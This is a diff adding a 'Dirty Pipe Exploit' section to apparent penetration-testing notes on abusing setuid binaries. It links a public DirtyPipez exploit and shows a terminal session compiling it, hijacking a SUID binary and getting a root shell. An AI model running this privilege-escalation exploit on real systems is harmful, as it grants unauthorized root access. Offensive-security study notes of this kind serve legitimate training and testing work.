@@ -1,6 +1,25 @@
 # Abusing Setuid Binaries and Capabilities
 
+## Dirty Pipe Exploit
 
+If we encounter a SUID / SGID binary it's worth trying the DirtyPipez exploit\
+[https://github.com/febinrev/dirtypipez-exploit](https://github.com/febinrev/dirtypipez-exploit)
+
+```shell-session
+victim@ubuntu:~$ ls
+RESET_PASSWD  a.out  dirtypipez.c  linpeas.sh  local.txt  snap
+
+victim@ubuntu:~$: gcc dirtypipez.c
+
+victim@ubuntu:~$ ./a.out /home/victim/RESET_PASSWD 
+[+] hijacking suid binary..
+[+] dropping suid shell..
+[+] restoring suid binary..
+[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+# whoami
+root
+
+```
 
 ## Enumeration
 
